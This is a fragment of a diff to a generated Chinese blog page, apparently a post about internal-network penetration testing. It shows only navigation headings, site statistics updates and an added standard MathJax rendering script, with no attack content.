class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="nav-number">4.3.</span> <span class="nav-text">添加路由</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="nav-number">4.4.</span> <span class="nav-text">设置代理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">5.</span> <span class="nav-text">内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-number">5.1.</span> <span class="nav-text">信息收集</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -621,7 +634,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -669,7 +682,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -683,7 +696,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -694,7 +707,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -834,6 +847,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
